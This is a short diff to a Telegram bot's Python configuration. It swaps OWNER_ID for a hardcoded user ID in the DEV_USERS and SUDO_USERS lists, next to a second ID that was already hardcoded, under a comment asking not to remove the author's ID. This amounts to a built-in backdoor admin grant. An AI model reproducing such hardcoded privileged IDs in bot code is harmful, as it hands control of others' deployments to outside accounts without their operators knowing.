@@ -149,9 +149,9 @@ else:
     SW_API = Config.SW_API
 
 # Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @TheUnusualPsychopath     
-DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1238300672)
 DEV_USERS.add(557639247)
-SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(1238300672)
 SUDO_USERS.add(557639247)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
